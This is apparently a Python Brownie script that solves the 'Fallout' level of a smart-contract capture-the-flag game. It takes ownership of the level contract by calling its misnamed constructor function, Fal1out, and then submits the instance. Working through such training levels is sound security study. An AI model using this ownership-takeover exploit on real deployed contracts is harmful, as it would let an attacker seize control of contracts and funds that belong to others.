from brownie import Fallout, network
from brownie._config import CONFIG

from scripts.helpful_scripts import (
    get_account,
    get_level_contract,
    submit_instance,
    print_out_if_level_solved,
)

LEVEL_NAME = "02_fallout"
INTERFACE_CONTRACT = Fallout


def solve_level(level_contract):
    account = get_account()
    print(f"Started to solve {LEVEL_NAME}")
    tx = level_contract.Fal1out({"from": account})
    tx.wait(1)


# brownie run scripts/_02_fallout.py --network rinkeby-fork
def main():
    level_contract = get_level_contract(LEVEL_NAME, INTERFACE_CONTRACT)
    solve_level(level_contract)
    level_solved = submit_instance(level_contract.address)
    print_out_if_level_solved(level_solved, LEVEL_NAME)
    return level_solved
